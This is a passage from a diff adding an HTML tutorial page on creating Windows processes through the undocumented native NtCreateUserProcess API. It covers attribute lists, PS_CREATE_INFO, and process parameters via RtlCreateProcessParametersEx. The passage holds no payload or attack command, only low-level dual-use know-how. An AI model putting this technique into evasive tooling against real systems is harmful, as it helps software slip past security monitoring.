+#define PS_ATTRIBUTE_SAFE_OPEN_PROMPT_ORIGIN_CLAIM	\
+    PsAttributeValue(PsAttributeSafeOpenPromptOriginClaim, FALSE, TRUE, FALSE)// Specifies the child process is isolated using the BNO framework
+#define PS_ATTRIBUTE_BNO_ISOLATION	\
+    PsAttributeValue(PsAttributeBnoIsolation, FALSE, TRUE, FALSE)
+
+// Specifies that the child&#x27;s process desktop application policy
+#define PS_ATTRIBUTE_DESKTOP_APP_POLICY	\
+    PsAttributeValue(PsAttributeDesktopAppPolicy, FALSE, TRUE, FALSE)</code></pre>
+        </div><h3 id="initializing-ps-attribute-list" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Initializing PS_ATTRIBUTE_LIST</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In the code snippet below, the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">PS_ATTRIBUTE_IMAGE_NAME</code> flag is used as the first attribute in the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">PS_ATTRIBUTE_LIST</code> structure, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">pAttributeList</code>. This flag represents the attribute that will hold the name of the process. By setting this attribute, the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateUserProcess</code> function is informed about which image to execute, which in this case is specified with the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">szProcessName</code> variable.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">PPS_ATTRIBUTE_LIST  pAttributeList          = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
+if (!pAttributeList)
+    return FALSE;
+
+// this is always set to the size of the &#x27;PS_ATTRIBUTE_LIST&#x27; structure
+pAttributeList-&gt;TotalLength                 = sizeof(PS_ATTRIBUTE_LIST);
+
+// the type of the attribute
+pAttributeList-&gt;Attributes[0].Attribute     = PS_ATTRIBUTE_IMAGE_NAME;
+// the size of the attribute value
+pAttributeList-&gt;Attributes[0].Size          = dwProcessNameLength;
+// the attribute value
+pAttributeList-&gt;Attributes[0].Value         = szProcessName;</code></pre>
+        </div><h3 id="initializing-additional-attributes" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Initializing Additional Attributes</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">To initialize additional attributes, update the number of elements in the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Attributes</code> array.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">typedef struct _PS_ATTRIBUTE_LIST
+{
+    SIZE_T TotalLength;
+    PS_ATTRIBUTE Attributes[2];       // updated to fit an additional attribute
+    // PS_ATTRIBUTE Attributes[3];    // updated to fit 3 attributes
+
+} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;</code></pre>
+        </div><h3 id="ps-create-info-createinfo" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>PS_CREATE_INFO CreateInfo</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateUserProcess</code>&#x27;s 10th parameter, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">CreateInfo</code>, is an input and output parameter and a pointer to the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">PS_CREATE_INFO</code> structure.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">typedef struct _PS_CREATE_INFO
+{
+	SIZE_T Size;
+	PS_CREATE_STATE State;
+	union
+	{
+		struct
+		{
+			union
+			{
+				ULONG InitFlags;
+				struct
+				{
+					UCHAR WriteOutputOnExit : 1;
+					UCHAR DetectManifest : 1;
+					UCHAR IFEOSkipDebugger : 1;
+					UCHAR IFEODoNotPropagateKeyState : 1;
+					UCHAR SpareBits1 : 4;
+					UCHAR SpareBits2 : 8;
+					USHORT ProhibitedImageCharacteristics : 16;
+				} s1;
+			} u1;
+			ACCESS_MASK AdditionalFileAccess;
+		} InitState;
+
+		struct
+		{
+			HANDLE FileHandle;
+		} FailSection;
+
+		struct
+		{
+			USHORT DllCharacteristics;
+		} ExeFormat;
+
+		struct
+		{
+			HANDLE IFEOKey;
+		} ExeName;
+
+		struct
+		{
+			union
+			{
+				ULONG OutputFlags;
+				struct
+				{
+					UCHAR ProtectedProcess : 1;
+					UCHAR AddressSpaceOverride : 1;
+					UCHAR DevOverrideEnabled : 1;
+					UCHAR ManifestDetected : 1;
+					UCHAR ProtectedProcessLight : 1;
+					UCHAR SpareBits1 : 3;
+					UCHAR SpareBits2 : 8;
+					USHORT SpareBits3 : 16;
+				} s2;
+			} u2;
+			HANDLE FileHandle;
+			HANDLE SectionHandle;
+			ULONGLONG UserProcessParametersNative;
+			ULONG UserProcessParametersWow64;
+			ULONG CurrentParameterFlags;
+			ULONGLONG PebAddressNative;
+			ULONG PebAddressWow64;
+			ULONGLONG ManifestAddress;
+			ULONG ManifestSize;
+		} SuccessState;
+	};
+
+} PS_CREATE_INFO, * PPS_CREATE_INFO;</code></pre>
+        </div><h3 id="initializing-ps-create-info" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Initializing PS_CREATE_INFO</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">While the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">PS_CREATE_INFO</code> structure is large, most of its elements are set by <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateUserProcess</code> when it&#x27;s executed successfully. The only elements that should be initialized before passing the structure to <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateUserProcess</code> are the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Size</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">State</code> elements as shown below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">PS_CREATE_INFO CreateInfo = { 0 };
+
+CreateInfo.Size  = sizeof(PS_CREATE_INFO);
+CreateInfo.State = PsCreateInitialState;</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The value of the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">State</code> element is derived from the enumeration below. However, in almost all cases, it is set to <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">PsCreateInitialState</code>.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">typedef enum _PS_CREATE_STATE
+{
+	PsCreateInitialState,
+	PsCreateFailOnFileOpen,
+	PsCreateFailOnSectionCreate,
+	PsCreateFailExeFormat,
+	PsCreateFailMachineMismatch,
+	PsCreateFailExeName,
+	PsCreateSuccess,
+	PsCreateMaximumStates
+
+} PS_CREATE_STATE;</code></pre>
+        </div><h3 id="rtl-user-process-parameters-processparameters" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>RTL_USER_PROCESS_PARAMETERS ProcessParameters</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Although the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ProcessParameters</code> parameter is designated as an optional parameter, setting it to <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NULL</code> will result in <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateUserProcess</code> failing with <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">0xC0000005</code> or <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">STATUS_ACCESS_VIOLATION</code>. The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">RTL_USER_PROCESS_PARAMETERS</code> structure is poorly documented by <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-rtl_user_process_parameters" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">Microsoft</a> and therefore the structure was retrieved from the <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntrtl.h#L2635" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">Process Hacker repository</a>.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">typedef struct _RTL_USER_PROCESS_PARAMETERS
+{
+	ULONG MaximumLength;
+	ULONG Length;
+
+	ULONG Flags;
+	ULONG DebugFlags;
+
+	HANDLE ConsoleHandle;
+	ULONG ConsoleFlags;
+	HANDLE StandardInput;
+	HANDLE StandardOutput;
+	HANDLE StandardError;
+
+	CURDIR CurrentDirectory;
+	UNICODE_STRING DllPath;
+	UNICODE_STRING ImagePathName;
+	UNICODE_STRING CommandLine;
+	PWCHAR Environment;
+
+	ULONG StartingX;
+	ULONG StartingY;
+	ULONG CountX;
+	ULONG CountY;
+	ULONG CountCharsX;
+	ULONG CountCharsY;
+	ULONG FillAttribute;
+
+	ULONG WindowFlags;
+	ULONG ShowWindowFlags;
+	UNICODE_STRING WindowTitle;
+	UNICODE_STRING DesktopInfo;
+	UNICODE_STRING ShellInfo;
+	UNICODE_STRING RuntimeData;
+	RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];
+
+	ULONG_PTR EnvironmentSize;
+	ULONG_PTR EnvironmentVersion;
+	PVOID PackageDependencyData;
+	ULONG ProcessGroupId;
+	ULONG LoaderThreads;
+
+} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;</code></pre>
+        </div><h3 id="initilizaing-rtl-user-process-parameters" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Initilizaing RTL_USER_PROCESS_PARAMETERS</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">To initialize the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">RTL_USER_PROCESS_PARAMETERS</code> structure, the <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntrtl.h#L2722" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">RtlCreateProcessParametersEx</a> native function is used.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">RtlCreateProcessParametersEx(
+    OUT 	PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
+    IN 		PUNICODE_STRING ImagePathName,
+    IN OPTIONAL PUNICODE_STRING DllPath,         // set to NULL
+    IN OPTIONAL PUNICODE_STRING CurrentDirectory,
+    IN OPTIONAL PUNICODE_STRING CommandLine,
+    IN OPTIONAL PVOID Environment,              // set to NULL
+    IN OPTIONAL PUNICODE_STRING WindowTitle,    // set to NULL
+    IN OPTIONAL PUNICODE_STRING DesktopInfo,    // set to NULL
+    IN OPTIONAL PUNICODE_STRING ShellInfo,      // set to NULL
+    IN OPTIONAL PUNICODE_STRING RuntimeData,    // set to NULL
+    IN ULONG Flags
+);</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The majority of the parameters are optional and can be set to <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NULL</code>. The important parameters are explained below.</p><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">pProcessParameters</code> - A pointer to the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">PRTL_USER_PROCESS_PARAMETERS</code> structure. This is the output of <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">RtlCreateProcessParametersEx</code>.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ImagePathName</code> - A pointer to a <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">UNICODE_STRING</code> structure that holds the complete path of the image file used to create the process. The provided image path must be in <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/c1550f98-a1ce-426a-9991-7509e7c3787c" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">NT path format</a>. For example, to create <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">C:\\Windows\\System32\\cmd.exe</code>, the path should be prefixed with <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">\\??\\</code> making it <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">\\??\\C:\\Windows\\System32\\cmd.exe</code>. This parameter is shown using Process Hacker in the image below.
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/ntcreateuserprocess-219843832-69179def-33c9-4145-a2cc-5b876df3d410.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">• <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">CurrentDirectory</code> - A pointer to a <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">UNICODE_STRING</code> structure that holds the current directory path of the created process. This parameter is shown using Process Hacker in the image below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/ntcreateuserprocess-319843814-83b44231-2b26-4236-8764-c0aab559838d.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">• <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">CommandLine</code> - A pointer to a <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">UNICODE_STRING</code> structure that holds the arguments for the created process. This parameter is shown using Process Hacker in the image below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/ntcreateuserprocess-419843782-b85fa358-4019-49dd-856f-605170af0661.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
